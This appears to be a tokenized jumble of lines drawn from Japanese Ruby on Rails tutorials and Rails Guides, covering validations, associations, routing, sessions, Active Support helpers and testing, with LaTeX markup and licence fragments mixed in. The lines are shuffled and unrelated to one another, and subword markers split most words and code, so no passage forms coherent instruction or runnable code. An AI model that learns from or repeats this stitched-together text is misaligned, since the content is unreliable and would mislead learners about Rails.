▁リスト \ ref { code : password _ reset _ edit _ action } では 以下のコード を使用しています 。
▁# ▁Expires * ▁ ディレクティブ を使用する場合 は Apache の
▁ テスト 環境で \ k ode { full \_ title } ヘルパー を使う
▁次に 、\ k ode { Test :: Uni t } の代わりに RSpec を使う ように 、 Rails の設定 を 変更します 。
▁# ▁=> ▁ ArgumentError : ▁invalid ▁date
▁ 以上の 説明 を 実際の User モデルに 適用 して できた 、 一 般 化 された \ k ode { authenticated ?} メソッドを リスト \ ref { code : generalized _ authenticated _ p } に示します 。
▁has _ one ▁: through 関連付けの 図 ]( images / has _ one _ through ▖ png )
▁has _ many ▁: tags
▁# ▁=> ▁Tue , ▁ 08 ▁Jun ▁2010 ▁01 : 5 6 : 22 ▁+0000
▁ここで の最初の 作業 は 、 フォローしているユーザー のリンク と フォロワー の リンクを 動く ように することです 。
▁( 実際には 、\ k ode { match } の 箇所 に \ k ode { get } を使用して も 同じ 名前付きルート になります が 、\ k ode { match } を利用する 方が より Rails の 慣例 に従って います ) 。
▁TIP : ▁ 折 り 返 し が発生し ない ぐらい に 十分 大きな サイズ の ターミナル を 使用できる のであれば 、` rake ▁routes ` コマンド の 出力 の方が おそらく 読みやすい でしょう 。
▁# ▁initialization ▁code ▁go es ▁here
▁constraints : ▁ Blacklist Constraint ▖ new
▁### ▁` with _ options `
▁デフォルトは ` ActionDispatch :: P ub li c E xception s ▖ new ( Rails ▖ public _ path ) ` です 。
▁@ msg ▁= ▁" N o ▁account ▁found ▁for ▁this ▁ supplier "
▁ きわめて シンプルな バリデーション の例 を 以下 に 紹介します 。
▁user ▁= ▁User ▖ new ▁do ▁| u |
▁ ╼ file s ▁( the ▁" Software ") , ▁to ▁deal ▁in ▁the ▁ Software ▁without ▁restrict ion ,
▁ シンボル \ k ode { : user } が \ k ode { factory } コマンド に渡され ると 、 Factory ▁Girl は それ に 続 く 定義 が User モデルオブジェクト を 対象 と している ことを 認 識 します 。
▁Home 、 Help 、 About ページ には 可 変 要素 が あるので 、 Rails の \ k ode { provide } 関数 を使用して タイトル を ページ ごとに 変更します 。
▁たとえば 、 注文 ( order ) が 顧客 ( customer ) に 従 属 している が 、 実際の 顧客 モデル名 が ` P at r on ` である 場合には 以下のように 指定します 。
▁else
▁ユーザー登録 に 失敗した場合 は new ビュー を再 描画 するよう にした ▟ その 際 、 Active ▁Record が自動的に 検 知 した エラーメッセージ を表示できるように した
▁- ----------------
▁a 1 ▖ x ▁# ▁=> ▁1 ▁( A が 使われ る )
▁ ブラウザ によって は 、「 中 断 した 時点 から 再 開 」 などの オプション 機能 で セッションを 復 旧 できる もの もあります ▟ このような 動作 は ブラウザ 依 存 で 、 かつ ブラウザ 側 で しか 行 え ないので 、 Rails サーバー では こうした セッション 復 旧 機能を 実現 する ことはできません 。
▁ 「\ href { http :// dev center ▖ heroku ▖ com / articles / local - postgresql } { Heroku ▁instructions ▁for ▁local ▁PostgreSQL ▁installation }」 には 、 PostgreSQL を ローカル 環境 に インストール する 手順 が 紹 介 されて ます 。
▁たとえば 、1 人 の 顧客 ( customer ) が 複数の 注文 ( order ) を持っている が 、 実際の 注文 モデル名 が ` Trans action ` である 場合には 以下のように 指定します 。
▁ ╼ including ▁without ▁ limit ation ▁the ▁right s ▁to ▁use , ▁copy , ▁modify , ▁merge ,
▁ アカウント有効化 の プレビュー メソッド ▁( 動作 可能 )
▁Rails ▁console のデフォルトの 環境 は \ text tt { development } です 。
▁[ Rails ▁development ▁ box ]( https :// github ▖ com / rails / rails - dev - box ) にある でき あ い の development 環境 を 入 手 する のが お す す め です 。
▁第 \ ref { cha : static _ pages } 章では 静的なページ を作成し 、 そこに 動的な 要素を 順 次 追加 していきます 。
▁ 通常 、 Web サイト は 80 番 ポート で 受 信 待 ち します が 、 この ポート を使用する には 特別な 権限 が必要になる こと が多い ので 、 Rails の開発 用 サーバー では 制限 の 少 ない 、 番号 の 大 き い ポート ▁( いわゆる ハ イ ナ ン バー ポート ) ▁ を使用します 。
▁` config / environments / production ▖ rb ` では 明示的に true に設定され ています 。
▁ 次のような 点に注意 しながら 進 め ましょう 。
▁次に 、 このメソッド 自身 は User モデルの 内部で しか 使用 し ないので 、 外部 の ユーザーが アクセス できるように する必要はありません 。
▁< p > Customer : ▁<%= ▁customer ▖ name ▁%></ p >
▁ すぐに 思い 付 く パーシャル の使い方 と い えば 、 パーシャル を サブ ル ー チ ン と 同等の もの とみなす という の があります ▟ ビュー の詳細 部分を パーシャル に移動し 、 コードの 見 通 し を 良 く するために 、 パーシャル を使う のです 。
▁[ T r end ▁M ic r o ]( http :// blog ▖ tr end micro ▖ com / my space - ex c ite - and - b li c k - serv e - up - malicious - banner - ads / ) による と 、 2008 年 初 頭 に 、 MySpace や E x c ite などの 有 名 サイトの バ ナ ー 広 告 に 悪意のある コードが 仕 込 まれ た という 事例 があり ました 。
▁` content _ for ` メソッドを使用することで 、 コンテンツ を 名前付き の ` yield ` ブロック として レイアウト に 挿 入 できます 。
▁Rails は 、\ k ode { form \_ for (@ user )} を使用して フォーム を構成する と 、\ k ode {@ user ▖ new \_ record ?} が \ k ode { true } の ときには \ text tt { POST } を 、\ k ode { false } の ときには \ text tt { PATCH } を使用します 。
▁` validates _ with ` は 、 バリデーション に使用する 1 つの クラス 、 または クラスの リスト を引数に取り ます 。
▁ 外部キー の詳細 は \ ref { sec : relationship _ user _ associations } で 学びます 。
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / class / subclasses ▖ rb ` です 。
▁ 既に 最初の タブ で サーバー を開始 している場合 は 、 Ctrl + C を 押 す と サーバー を 終 了 できます 。
▁ 変更 後 の データモデル は 図 \ ref { fig : user _ model _ account _ activation } のようになります 。
▁Web アプリケーションの リポジトリ には 、 暗号化 キー や パスワード などの 機 密 情報 が含まれ る可能性があります ▟ このような 情報を 利用 される と 、 サイトの コード 実行 の セキュリティ が お び や か される かもしれません 。
▁t ▖ string ▁: name
▁Client ▖ select (" view able _ by , ▁ locked ")
▁ ひ と まず この エラー は 無視 しましょう 。
▁ データ が 有効な 場合 のテスト も 大きな 違い はありません が 、 今度は カウント が更新され ない の ではなく 、 カウント が 1 つ 増え る ことを確認します 。
▁` DateTime ` クラスは ` Date ` の サブクラス であり 、` active _ support / core _ ext / date / calculations ▖ rb ` を 読み込む ことで これらの メソッドと 別 名を 継 承 することができます ▟ ただし これらは 常に datetime s を返す 点 が異なります 。
▁ここで 、 以前 に 説明 した \ k ode { if } - \ k ode { else } 分 岐 構造 を 思い 出 してください ▟ この 文 を使用して 、 保存 が成功した かどうか に応じて \ k ode {@ user ▖ save } の 値が \ k ode { true } または \ k ode { false } ▁(\ ref { sec : creating _ user _ objects }) ▁ になる ときに 、 それぞれ 成功 時の 処理 と 失敗 時の 処理を 場合 分 け することができます 。
▁ メイラー のテスト
▁ どの くらい 細 か く テスト するか は お 任 せ します ▟ リスト \ ref { code : error _ messages _ test } に テンプレート を用意し て お いた ので 、 参考にしてください 。
▁ 現在 どの ディレクトリ で 作業 している か が わ から なく な った 場合は 、\ ref { sec : the _ first _ application } ▁( {2}{1} 図 ▁1▖ 4 {/1}{/2} ) を再度 参 照 して 、 Rails ▁ の ディレクトリ 構造 を 確認してください 。
▁ユーザー を検索する 一般的な 方法を あ と 少しだけ ご 紹 介 して 、 この節 を 終わり にする ことにしましょう 。
▁ では 、 オブジェクトが 本当に 削除 された かどうかを どのように して 知 れば よい のでしょうか 。
▁ フォローしているユーザー を表示する ページ と 、 フォロワー を表示する ページ は 、 いずれも ユーザープロファイルページ と ユーザーインデックスページ ▁(\ ref { sec : user _ index }) ▁ を 合わせ た ような 作り になる という 点 で 似 ています ▟ どちら にも フォロー の 統 計 情報 などの ユーザー情報 を表示する サイドバー と 、 ユーザーの リスト があります 。
▁ ま とも な テスト がない
▁create ▁app / views / blorgh / articles
▁(\ k ode { user _ id } と \ k ode { created _ at } に インデックス が与えられ ていること に 注意 )
▁X 1 ▁= ▁1
▁これは あくまで 説明 の ためのものです ) 。
▁# ▁app / controllers / users _ controller ▖ rb
▁ 前 回 の アクセス制御 と同様に 、 まずは テスト から 書いていきます ▟ 今回 使う テストは リスト \ ref { code : following _ followers _ authorization _ test } のとおり です 。
▁use ▁#< ActiveSupport :: Cache :: S trategy :: Local Cache :: Middleware : 0 x 0 000 000 1 c 3 04 c 8 >
▁ パスワード 再設定 時の エラー 表示 を更新する
▁< div >
▁=> ▁42
▁ ログイン 失敗 時の 正しい 処理
▁最初に 、 生成された テンプレート を カスタマイズ して 、 実際に 有効化 メール で 使えるように します ▁( リスト \ ref { code : application _ mailer }) 。
▁ パーシャル に オブジェクトを 渡す ために 、 値が オブジェクト で 、 キー が パーシャル での 変数 名 と同じ ハッシュ を 利用 します ▟ これで 、 以下のコード が 完成 します 。
▁ レイアウト 内の いくつかの リンクを 埋 め ること が できたので 、 これらの リンク が正しく 動いている かどうか チェック する テスト を書いて みましょう 。
▁リスト \ ref { code : micropost _ ordering } では 新たに 、 ラ ム ダ 式 ▁( S tab by ▁ lambda ) ▁という 文法 を使っています ▟ これは 、\ emph { Proc } や \ emph { lambda } ▁( も しく は \ emph { 無名 関数 }) と呼ばれる オブジェクト を作成する 文法 です 。
▁ このような コード があると 、 悪意のある 人 物 が データベース を 意 のまま にする ことができ 、 データベース 全体 が 危 険 に さ ら されます 。
▁(\ ref { sec : updating _ user _ objects } で 説明したように 、 このメソッドは バリデーション を 素 通り させ ます ▟ ここでは ユーザーの パスワード や パスワード 確 認 にアクセス できない ので 、 バリデーション を 素 通り させ なければなりません ) 。
▁ バリデーション の実行 直前に 呼び出される メソッド名 を シンボル で `: if ` や `: unless ` オプション に 指定することもできます 。
▁ 共通の バリデーション オプション を以下に示します 。
▁ 1235551234 ▖ to _ s (: phone , ▁are a _ code : ▁true )
▁ 一般に 、 ある メソッドが オブジェクト のインスタンス を 必要 と していない 場合は 、 クラスメソッド にする のが 常 道 です 。
▁ この時点で 、 User モデルの spec は パスするはずです 。
▁` only ` メソッドを使用すると 、 条件 を上書き できます 。
▁# ▁ デフォルト ▁( 作成 時 と 更新 時の どちらの 場合にも バリデーション を行なう )
▁ サインイン が 失敗した ときの 正しい コード 。
▁* ▁ デプロイ 先 が 複 数 あり 、 同じ 作業を 繰り返し たくない 。
▁これらの 2 つの フォーム では 、 いずれも \ k ode { form \_ for } を使用して Relationship モデルオブジェクト を 操作 しています ▟ これらの 2 つの フォームの 主な 違い は 、 リスト \ ref { code : follow _ form } は \ emph { 新しい } リレーションシップ を作成する の に対し 、 リスト \ ref { code : unfollow _ form } は 既存の リレーションシップ を見つけ 出 す という 点 です 。
▁ ログインフォーム から 送信された \ k ode { params } ハッシュ に は既に チェックボックス の値 が含まれています ▟ リスト \ ref { code : remember _ me _ checkbox } の フォーム に 無効な 値を 入力 して 実際に 送信 すれば 、 ページの デバッグ情報 で 値 を確認する こともできます 。
▁第 一 段 階 として 、 サンプルアプリケーション に リンク と スタイル を追加する ために 、 サイトの レイアウトファイル \ k ode { application ▖ html ▖ erb } ▁( リスト \ ref { code : application _ layout _ full _ title } で 登 場 ) ▁ に HTML 構造 を追加し 、 レイアウトファイル を更新し ます 。
▁<%= ▁form _ for ▁[ @ article , ▁@ article ▖ comments ▖ build ] ▁do ▁| f | ▁%>
▁### ▁Time
▁### ▁ 静 的な セグメント
▁[ Cache - Control ヘッダ ]( http :// www ▖ w 3 ▖ org / Protocol s / rfc 2 6 16 / rfc 2 6 16 - sec 14 ▖ html # sec 14 ▖ 9 ) は 、 リクエストが キャッシュ される 方法を 定 め た W 3 C の 仕 様 です 。
▁* ▁` from `
▁上のコードは 、 統合テスト の実行 中に は \ k ode { true } を返し 、 その他の 場合には false を返します 。
▁(\ ref { sec : uniqueness _ validation } では メールアドレス をすべて 小文字 で 保存 して いた ことを思い出しましょう ▟ そこで ここでは \ k ode { downcase } メソッドを使用して 、 有効なメールアドレス が 入力 された ときに 確 実に マッチする ようにしています ) 。
▁これで 、 テストが ▁\ passing ▁ になるはずです 。
▁ 完全な メッセージ は以下のような感じ になります 。
▁ここでは 、1 人のユーザー に対し 複数の マイクロポスト があると しましょう 。
▁ 実は 、 この 2 つ は 完全に 同等です ▟\ k ode { attr _ accessor } は 、 単 に ゲ ッ ター メソッド や セッター メソッドを 自動的に 作成する 便利な 方法で しか ありません 。
▁render ▁' edit '
▁\ k ode { full _ title } メソッド を持つ RSpec ユーティリティ ー 用 ファイル 。
▁ Asset ▁Pipeline ▁(\ ref { sec : sass _ and _ the _ asset _ pipeline }) の一部 であり 、 この ディレクトリ に置かれ た スタイルシート は \ k ode { application ▖ css } の一部 として 自動的に Web サイトの レイアウト に インクルード されます 。
▁Git リモート は 他の 場 面 でも 何か と 便利な ものです が 、 まだ 作成 していない 場合は 以下 を 最初に 行 ってください 。
▁Ruby では 、\ text tt { nil } と \ text tt { false } を除いて 、 あらゆる オブジェクトの 論理値 が \ text tt { true } になるように 設計 されています ▟ さらに Ruby では 、\ text tt {||} 演算子 を い く つ も 連続 して 式 の中で 使用する 場合 、 項 を 左 から 順に 評価 し 、 最初に true になっ た時点で 処理を 終 え るように 設計 されています
▁もし 上の 例 が 少し 不 自然に 思える なら ば 、 勘 が 鋭 い と い えます ▟ という の も 、 これは わざと 不 自然に 書いた からです 。
▁ 一般に 、 Rails の開発 モードでは ファイルに 変更 を加え た場合 でも サーバーを再起動 する必要はありません ▟ ファイルの 変更 は自動的に サーバー に 反映され ます ( 訳 注 : ▁ lib ファイル や application ▖ rb など 一部の 設定ファイル など は サーバーを再起動 しない と 読み 込 まれ ません ) 。
▁# ▁ visible _ articles ▁ メソッドは リレーション を 1 つ 返す ことが 期 待 されている
▁ 本番環境で の 画像アップロード
▁ puts ▁client ▖ address ▖ post code
▁“ Engine ▁X " ▁ と発音します 。
▁これで 、 フォロー / フォロー解除 の 機能 が完成しました ▟ どの ユーザー も 、 他のユーザーをフォロー したり 、 フォロー解除 したり できます ▟ サンプルアプリケーション を 実際に 動 か してみ たり 、 以下のように テストスイート を実行する ことで 動作を 確 認 できます 。
▁この 方法は 、 文字列 が 十分 短い 場合にのみ 使用する のが よいでしょう 。
▁ 将来 、 ユーザー 定義 の タイムゾーン が システム の タイムゾーン と 比 較 される こと があり えます ▟ システム の タイムゾーン で はデフォルトで ` Time # now ` が使用されます 。
▁$ ▁rails ▁c
▁=> ▁ String
▁ 関連付けられた レコード の存在 が 必 須 である場合 、 これ を検証する には `: inverse _ of ` オプションで その 関連付け を指定する 必要があります 。
▁ NoMethodError : ▁You ▁have ▁a ▁nil ▁object ▁when ▁you ▁did n ' t ▁expect ▁it !
▁ 通常 はこの 3 つの 環境で 事 足 ります が 、 場合によっては 環境 を追加した くなる ことも ある と思います 。
▁リスト { p 0} の {2} hello {/2} アクション を書き換え 、「 Hello , ▁world !」 の代わりに 「 hola , ▁ mundo !」 と 表示される ように してみましょう 。
▁Guard の設定 が完了し たら 、 新しい ターミナル を開き ▁(\ ref { sec : rails _ server } で や った ように Rails サーバー の ターミナル と 別 にする のが ポイント です ) 、 以下 を コマンドラインで 実行 します
▁`: allow _ nil ` オプションを使用すると 、 例外 の 代りに ` nil ` を返す ように することができます 。
▁ あるいは 、 自分の アイディア に 興 味 を 示 してくれる 人 が 返 信 してくれる かもしれません 。
▁最後に 以下を実行して Ruby ▁ 2▖0▖ 0 をインストール します ▟ ここでは O p en SSL の 場所 を RVM に 知 ら せる オプション を追加して あります 。
▁\ label { fig : heroku _ sample _ users } }╼\ end { figure }╼╼\ subsection { 本章の まとめ } ▁% ▁( fold )╼\ label { sec : updating _ what _ we _ learned _ in _ this _ chapter }╼╼\ begin { item ize }╼╼\ item
▁これで 、 先に 述 べ た ア リ ス の シナリオ は うまく い く ようになります ▟ データベース は 、 最初の リクエスト に基づいて ユーザーの レコードを 保存 します が 、2 度 目 の 保存 は 一意性 の 制 約 に 反 する ので 拒 否 します
▁\ href { http :// p eep code ▖ com /}{ PeepCode } と \ href { http :// mb sy ▖ co / 6 V Q 8 l } { Code ▁School } ▟ PeepCode の スクリーンキャスト と Code ▁School の イン タ ラ ク ティブ コース は 品 質 が 高い ことで 知 ら れ ており 、 強く お勧め いた します 。
▁scaffold ▁ を 使わない 代わりに 、 開発 の各 ステップ で 、 手 頃 な \ emph { 一 口 サイズ } のコード を書いて も ら います ▟ この 一 口 サイズ のコードは 、 無 理 なく 理解 できる 程 度 に シ ン プ ル で 、 かつ 、 ある程度 の 歯 ご た え と や り が い を 得 られる ように 配 慮 して あります 。
▁` config / application ▖ rb ` に記述 することで 、 標準 の ` assets /* ` に 加えて 追加 の ▁( full y ▁ qualified ) ▁ パス を パ イ プ ラ イン に追加する ことができます 。
▁ フ ォ ワ ー デ ィ ング 自体 を実装する には 、\ k ode { redirect _ back _ or } メソッドを使用します ▟ リクエスト された URL が存在する 場合は そこ にリダイレクトし 、 ない場合は 何らかの デフォルトの URL にリダイレクトし ます ▟ デフォルトの URL は 、 Session コントローラの \ k ode { create } アクション に追加し 、 サインイン 成功 後に リダイレクト します ▁( リスト \ ref { code : friendly _ session _ create }) 。
▁ ╼ ▁=> ▁true
▁def ▁self ▖ br o ad c a st _ notification s ( users , ▁ ▖▖▖)
▁" Admin User "▖ underscore ▁# ▁=> ▁" admin _ user "
▁` app / assets ` に置かれ た ファイルが そのまま の 形で production 環境 で使用される ことは 決 して ありません 。
▁ 本チュートリアル で こ の詳細 が 重要 になる ことはありません ▟ また 、 この 外部キー による 制 約 は 、 すべての データベース で 使える わけではありません
▁format ▖ json ▁ { ▁render ▁ json : ▁@ user ▁ }
▁| ▁| ▁50 6 ▁| ▁: var ia nt _ also _ ne got i ate s ▁|
▁ 送信 先 の 指定 は ` form _ for ` の `: url ` オプションで 簡単に 指定 できます 。
▁ これはリスト \ ref { code : name _ title _ and _ head ing } で使用されていました 。
▁< div ▁id =" right _ menu "> R ight ▁ menu ▁ items ▁here </ div >
▁最初に 無料 の サービス を利用して メールを送信 し 、 続いて アプリケーションの 設定 と デプロイ を行います 。
▁これ をチェックする には 否 定 演算子 ▁(\ ref { sec : objects _ and _ message _ passing }) が必要 なので 、\ k ode { !} ▁( 参 考 : ▁ 英語 では bang と 読み ます ) ▁ を使用します 。
▁` ordinalize ` メソッドは 、 レシーバの 整 数 に 、 対応する 序 数 文字列 を追加 したものを か え します 。
▁ より 複雑な オブジェクトを 複 製 する ▁" deep ▁copy " ▁ を実装する ことは は る か に 難 しい 問題 であり 、 実際に 一般的な 解決策 はありません が 、 検索 エンジン で ▁" ruby ▁ deep ▁copy " ▁ を検索する と 、 ネストした 配列 のような 、 より 複雑な 構造 を コピー する 必要がある 場合 の 解決策 が 見つかる と思います ▟)
▁module ▁Blorgh :: Concern s :: Model s :: Article
▁* ▁` find _ all _ by _▖▖▖` ▁ に代えて ▁` where (▖▖▖)
▁( テーブル CSS の ルール が ネスティング ▁( 入 れ 子 ) ▁ されています が 、 これが 有効 になる のは Asset ▁Pipeline で Sass エンジン が 使用されている 場合に 限 られます ) ▁ 。
▁* ▁Active ▁Record モデル を使用して リ レ ー シ ョ ナ ル データベースに保存 された データを 操作 する
▁* ▁Rails ▁4 では Ruby ▁2▖0 が 推 奨 されます ▟ Ruby ▁ 1▖9▖3 以上 が 必 須 です 。
▁Client ▖ where (" created _ at ▁> = ▁: start _ date ▁ AND ▁created _ at ▁< = ▁: end _ date ",
▁ユーザーの id は \ k ode { params [: id ]} 変数 で 取り出す ことができる の を 思い 出 してください ▟ つまり 、 リスト \ ref { code : initial _ edit _ action } のコード を使えば そのユーザー を 指定 できる ということです 。
▁ フ ォ ー ク を アップ デ ート します 。
▁\ begin { equ ation }╼\ label { eq : de lt a _ e }╼\ D el t a ▁t _ e ▁= ▁t _ N ▁- ▁t _ e ▖
▁<%= ▁ audio _ tag ▁" m us ic / first _ s on g ▖ mp 3 " ▁%>
▁% w ( Earth ▁Wi nd ▁ Fi re )▖ to _ sentence ▁# ▁=> ▁" Earth , ▁Wi nd , ▁and ▁ Fi re "
▁### ▁ インライン コールバック ブロック で ` return ` の使用 法
▁上のコード で 1 つ 残 念 な 点 があると すれば 、 ブラウザ と の やりとり が 1 往 復 増え ること です ▟ ブラウザから ` / books /1 ` に対して show アクション が呼び出され 、 コントローラ が 本 が 1 冊 も ないこと を 検出 すると 、 コントローラは ブラウザ に対して ステータスコード 302 ▁( リダイレクト ) ▁ レスポンス を返し 、` / books / ` に 再度 アクセス するよう ブラウザに 指 令 を 出 します ▟ ブラウザは この 指 令 に 応 じ 、 この コントローラの ` index ` アクション を呼び出す ための リクエストを 改 めて サーバー に 送信 します ▟ そして コントローラは この リクエスト を受け て データベースから すべての 蔵 書 リスト を取り出し 、 index テンプレート を レンダリング して 出力結果 を ブラウザに 送 り 返す と 、 ブラウザで 蔵 書 リスト が表示されます 。
▁ マニフェストファイル は 必要に応じて い く つ で も使用できます 。
▁ コントローラの 機能 は 、 通常 であれば たとえば 以下のように ` GET ` を コントローラに 送信 することで テスト する でしょう 。
▁S ublime ▁Text を使用し ていれば 、 エディタ の中から 直接 テストを実行 できる 強力な ヘルパー コマンドを 利用できます 。
▁ユーザー / リレーションシップ の \ k ode { has _ many } の関連付け を実装する 。
▁account ▖ to _ query (' com p any [ name ] ')
▁layout ▁' a wesome ' ▁# ▁a wesome ▖ ( html | text )▖ erb を レイアウト として 使用する
▁最初の 行 と同様 で 、 RSpec ▁ は ダブルクォート ▁( ") ▁ で 囲 まれ た 文字列を 無視 します ので 、 ここに も 人 間 にとって わかりやす い 説明 文 を 書き ましょう ▁( 訳 注 : ▁ 英語 で ▁should ▁have ▖▖▖ と 書くこと で 、 メソッドの it と 整 合 性 が 取 れ ます ) 。
▁ サンプル データ 生成 タスク に 管理者 を 1 人 追加する
▁ アプリケーション 環境 が表示されている デフォルト ページ 。
▁#### # ▁` collection ▖ where (▖▖▖)
▁デフォルトは `: utc ` です 。
▁* ▁ MVC ▁( モデル ・ ビュー ・ コントローラ ) ▁ および RESTful デザイン の基礎
▁d ▁= ▁Date ▖ new (201 0, ▁5 , ▁ 8 ) ▁# ▁=> ▁S at , ▁ 08 ▁May ▁2010
▁### ▁ 使用 法
▁#### ▁ デ コ レ ー タ と コードの 読み込み に関する メ モ
▁リスト \ ref { code : signup _ with _ account _ activation _ test } のテスト が できたので 、 ユーザー 操作 の一部 を コントローラ から モデルに 移動 する という さ さ や か な リファクタリング を行う 準備ができました 。
▁それでは 、 リスト \ ref { code : layout _ new _ structure } の 新しい 要素を 上 から 順に 見 ていきましょう 。
▁URL に対するテスト が でき あ が った ので 、 それら を 実際に 利用できる ようにしましょう 。
▁* ▁上 記 以外の 場合 で 、 引数 が ` to _ ary ` に応答する 場合は ` to _ ary ` が呼び出され 、` to _ ary ` の 値が ` nil ` で ない場合は その 値 が返されます 。
▁ 今 の状態 では 、 新しく アカウント を 登録 した ユーザーは アカウント に対する フル アクセス 権限 を 持 っています ▁( 第 \ ref { cha : sign _ up } 章 ) ▁ が 、 このままでは い か にも 大 雑 把 です 。
▁ 変更を マージ した 後 は 、\ k ode { git ▁branch ▁- d } を実行して トピックブランチ を 削除 すれば 終わり です 。
▁REST は 、 イン ター ネ ッ ト そのもの や Web アプリケーション などの 、 分 散 ・ ネットワーク 化 された システム や アプリケーションを 構 築 するための アーキテクチャ の スタイル の 1 つ です 。
▁ 今 の 段階で テストを 書 か せ よう と すると 、 尻 込 み してしまう 人 も い る かもしれません 。
▁ バリデーション の詳細 を 説明 する 前に 、 アプリケーション 全体 において バリデーション が い か に 重要 である か について説明します 。
▁<%= ▁render ▁@ products ▁%>
▁class ▁ Proc
▁ レイアウト を 決定 する 際に 、 Proc などの インライン メソッド を使用することもできます 。
▁上のコードは 、 最初の 30 クライアント を スキップ して 3 1 人 目 から 最大 5 人 の クライアント を返します 。
▁リスト \ ref { code : backtrace _ silencer } の コメント 冒 頭 にある ように 、 backtrace ▁ silencer を追加した 後 は 必ず Rails ▁web サーバーを再起動 してください 。
▁ 実際には 、 この 関連付け では 以下のように \ emph { クラス } 名 を明示的に 含 め る 必要がある ことに注意してください 。
▁</ table >
▁これ だけで も かなり の 量 ですが 、 ▁Web 開発 つ いて 学ぶ べ き こと はまだ まだ たくさん あります 。
▁# ▁=> ▁[ ' admin ', ▁' member ', ▁' guest ']
▁ サンプル コード
▁( 最初に テスト を書いて も よ か った のですが 、 ルーティング を更新し て お か ない と 名前付きルート の 説明 が し に く か った ので 、 テストを 後に しました ) ▁ 。
▁ モデルの テーブル に含まれる レコード の 個 数を 数 え る には ` Client ▖ count ` を使用できます ▟ 返される のは レコード の 個 数 です 。
▁ 現在の 一意性 検証 では 大文字 小文字 を 区別 している ため 、\ k ode { user _ with _ s a me _ email ▖ valid ?} は \ k ode { true } になります ▟ しかし 、 ここでは \ k ode { false } になる 必要があります 。
▁( 例えば 、 行 末 に セ ミ コロン を書く 習慣 が つ い ている かもしれませんが 、 Ruby ▁ では 行 末 に セ ミ コロン を 置 いて も 問題 なく 動 きます ▟)
▁ これはリスト \ ref { code : palindrome _ if } で使用されていました 。
▁` camelize ` メソッドは 、 レシーバ を キャメルケース ▁( 冒 頭 を 大文字 にした 単語 を スペース なしで 連結 した 語 ) ▁ に したものを 返します 。
▁Rails ▁4 は ` app / assets / javascripts / application ▖ js ` と ` app / assets / stylesheets / application ▖ css ` ファイルを 両方 作成します ▟ これは Rails アプリケーション 新規 作成 時に - - skip - sprockets を指定する かどうか にかかわらず 行われます 。
▁ バリデーション ヘルパー には 、 それぞれ デフォルトの エラーメッセージ が 用意されています 。
▁上の params ハッシュ には 、 Person モデル 用の 値が ネストした 形で 含 まれ ているので 、 コントローラで ` params [: person ]` と 書くこと で 内容 にアクセス できます 。
▁ 既に 例 示 した ように 、`: message ` オプションを使用することで 、 バリデーション 失敗 時に ` errors ` コレクション に 追加される カスタム エラーメッセージ を指定できます 。
▁ 本書 では 、 以後 サンプルアプリケーション を 肉 付け すること に 専 念 します ▟ 最初に 、 ユーザー登録 、 サインイン 、 サインアウト できる ユーザー を追加します ▟ 次に 、 マイクロポスト を追加します ▟ 最後に 、 他のユーザーをフォロー できるようにします 。
▁ 多くの アダプタ では 複数の キュー を扱う ことができます 。
▁` blorgh _ articles ` テーブルの レコード と 、` users ` テーブルの レコードを 関連付け るため の 方法 が必要です 。
▁Using ▁the ▁ generalized ▁\ k ode { authenticated ?}
▁図 \ ref { fig : user _ show _ rails _3} の デバッグ情報 で \ k ode { params [: id ]} の 値を 確 認 できる ことにも注目してください 。
▁invoke ▁helper
▁" A n y ▁modification s ▁you ▁make ▁will ▁be ▁roll ed ▁back ▁on ▁ ex it " ▁( ここで 行った すべて の変更は 終 了 時に ロールバック されます ) ▁という メッセージ に わかりやすく 示 されている ように 、 コンソール を サ ンド ボックス で 起動 すると 、 その セッション で 行った データベース への 変更を コンソール の 終 了 時に すべて ▁“ ロールバック ” ▁( 取り 消 し ) ▁ してくれます 。
▁これは 間 違い なく 大きな 進 歩 です ▟ しかし ここで 終 わ ら せず 、 さらに 改良 してみましょう ▟ 今度は \ k ode { render } を \ k ode {@ users } 変数 に対して \ emph { 直接 } 実行 します ▁(\ ref { code : index _ final _ refactoring }) 。
▁" application - 723 d 1 be 6 cc 7 4 1 a 3 a abb 1 ce c 242 76 d 6 8 1 ▖ js "," application ▖ css " :
▁この 動作を \ k ode { store \_ location } と \ k ode { redirect \_ back \_ or } の 2 つの メソッドを使用して 実現 してみましょう ▟ なお 、 これらの メソッドは Sessions ヘルパー で 定義 しています ▁( リスト \ ref { code : friendly _ forwarding _ code }) 。
▁ 今後 、 コンソール コマンド の 出力 は 、 特に 教 育 的 効果 が 高い と 思える 場合 ▁( ここで の \ k ode { User ▖ new } の場合 など ) ▁ を除いて 省略 いた します 。
▁create ▁test / helpers / users _ helper _ test ▖ rb
▁" people "▖ classify ▁# ▁=> ▁" Person "
▁<%= ▁link _ to ▁' よう こ そ ', ▁ welcome _ url ▁%>
▁#### # ▁`: location ` オプション
▁\ k ode { spec / support } ディレクトリ は RSpec によって自動的に 読み込まれる ため 、 Home テスト は以下のように 書く ことができます 。
▁< option ▁value =" "> P lease ▁select </ option >
▁resources ▁: example s
▁index ビュー に対する 最初の リファクタリング
▁Users リソース を routes ファイル に追加する
▁なお 、 送信 に 失敗した ときに \ k ode { new } アクション が 再 描画 される は ず なので 、\ k ode { assert _ template } を使った テスト も含め ている ことに注意してください 。
▁( 興 味 のある 方は 、 RailsCast の 「\ href { http :// r ailscasts ▖ com / episodes / 2 67 - coffee script - basic s } { CoffeeScript の基礎 } ▁( 英語 )」 から 始 め ると 良い でしょう ) 。
▁@ article ▖ destroy
▁\ k ode { name } 属性 に 長さ の検証 を追加する
▁scope ▁' admin ' ▁do
▁ 以下のように 、 数値 を 通 貨 形式 の 文字列に変換 できます 。
▁ authenticated ?( : activation , ▁token )
▁ 言 う まで も ないこと ですが 、 既存の アプリケーションを アップグレード する 際に は 、 何 のために アップグレード する のか を は っ き り させ ておく 必要があります 。
▁\ k ode { git ▁push } コマンドで 変更を リモート リポジトリ に プッシュ する方法 については \ ref { sec : git _ commands } で 解説します 。
▁ このような 場合は 、` unscope d ` の ブロック 形式 を使用すること が 推 奨 されます 。
▁# ▁< url - id > j er e my - k e mp er </ url - id >
▁Rails での 無 用 な ト ラ ブ ル を 避ける ための 最も 初 歩 的な 方法は 、 外部 データを 常に UT F -8 で 保存 することです 。
▁string is h ▖ to _ s ▖ html _ safe
▁` collection ▖ create ` メソッドは 、 関連付け が 行われた オブジェクトを 1 つ 返します 。
▁orphan ▁= ▁Object ▖ send (: remove _ const , ▁: M )
